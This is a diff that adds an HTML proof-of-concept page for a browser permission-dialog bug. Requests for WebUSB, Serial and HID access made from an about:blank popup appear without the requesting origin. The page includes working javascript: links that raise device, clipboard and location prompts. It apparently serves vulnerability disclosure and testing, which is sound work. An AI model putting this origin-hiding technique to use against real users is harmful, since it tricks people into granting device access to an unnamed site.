@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC: Origin Spoofing in Permission Chooser (WebUSB/Serial/HID)</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        .note { margin-top: 20px; padding: 10px; background: #ffeeee; border-left: 4px solid red; font-size: 14px; }
+        .success { background: #eeffee; border-left-color: green; }
+    </style>
+</head>
+<body>
+    <h2>PoC: Origin Spoofing via about:blank Popup</h2>
+    <p>This PoC demonstrates that permission dialogs for WebUSB, Web Serial, and WebHID <strong>do not show the correct origin</strong> when triggered from an <code>about:blank</code> popup window.</p>
+    <p><strong>Expected secure behavior:</strong> The permission dialog should clearly display the requesting origin (e.g., <code>https://your-domain.com</code>).</p>
+    <p><strong>Observed vulnerable behavior:</strong> The dialog shows only <code>"wants to access the following permissions:"</code> without any origin.</p>
+
+    <button onclick="openPopup()">Open Popup and Test</button>
+
+    <div class="note">
+        <strong>Test instructions:</strong><br>
+        1. Click the button above to open an <code>about:blank</code> popup.<br>
+        2. In the popup, click any of the <strong>"Wrong (USB)"</strong>, <strong>"Wrong (Serial)"</strong>, or <strong>"Wrong (HID)"</strong> links.<br>
+        3. Observe the permission dialog – the origin should be missing.<br>
+        4. Compare with <strong>"Normal (Audio)"</strong> or <strong>"Normal (GeoCode)"</strong> – those correctly show the origin (because they use different permission APIs).
+    </div>
+
+    <script>
+        function openPopup() {
+            // Open a blank popup window
+            const newWindow = window.open("about:blank", "_blank", "width=600,height=400");
+            if (!newWindow) {
+                alert("Popup blocked! Please allow popups for this site and try again.");
+                return;
+            }
+
+            // Define permission-triggering javascript: URLs
+            const usbCode = "javascript: navigator.usb.requestDevice({filters:[]});";
+            const serialCode = "javascript: navigator.serial.requestPort({filters:[]});";
+            const hidCode = "javascript: navigator.hid.requestDevice({filters: []});";
+            
+            // Normal (secure) permission APIs – for comparison
+            const audioCode = "javascript: navigator.mediaDevices.getUserMedia({audio: true});";
+            const shareScrCode = "javascript: navigator.mediaDevices.getDisplayMedia();";
+            const geolocationCode = `javascript: navigator.geolocation.getCurrentPosition(p => alert('Location: ' + p.coords.latitude + ',' + p.coords.longitude), e => alert('Geolocation error'));`;
+            const clipboardReadCode = `javascript: navigator.clipboard.readText().then(t => alert('Clipboard: ' + t));`;
+            const clipboardWriteCode = "javascript: navigator.clipboard.writeText('PoC text'); alert('Clipboard written');";
+
+            // Build the popup content
+            newWindow.document.body.innerHTML = `
+                <div style="font-family: monospace; padding: 20px;">
+                    <h3>Popup Window (about:blank)</h3>
+                    <p><strong>Vulnerable (missing origin):</strong></p>
+                    <a href="${usbCode}" style="display: block; margin: 5px 0;">🔴 Wrong (USB) – origin MISSING</a>
+                    <a href="${serialCode}" style="display: block; margin: 5px 0;">🔴 Wrong (Serial) – origin MISSING</a>
+                    <a href="${hidCode}" style="display: block; margin: 5px 0;">🔴 Wrong (HID) – origin MISSING</a>
+                    <hr>
+                    <p><strong>Secure (shows correct origin – for comparison):</strong></p>
+                    <a href="${audioCode}" style="display: block; margin: 5px 0;">✅ Normal (Audio) – origin SHOULD be visible</a>
+                    <a href="${shareScrCode}" style="display: block; margin: 5px 0;">✅ Normal (Screen Share) – origin SHOULD be visible</a>
+                    <a href="${geolocationCode}" style="display: block; margin: 5px 0;">✅ Normal (Geolocation) – origin SHOULD be visible</a>
+                    <a href="${clipboardReadCode}" style="display: block; margin: 5px 0;">✅ Normal (Clipboard Read) – origin SHOULD be visible</a>
+                    <a href="${clipboardWriteCode}" style="display: block; margin: 5px 0;">✅ Normal (Clipboard Write) – origin SHOULD be visible</a>
+                    <hr>
+                    <p style="font-size: 12px; color: #666;">This PoC is for security research only. No data is collected.</p>
+                </div>
+            `;
+            newWindow.focus();
+        }
+    </script>
+</body>
+</html>
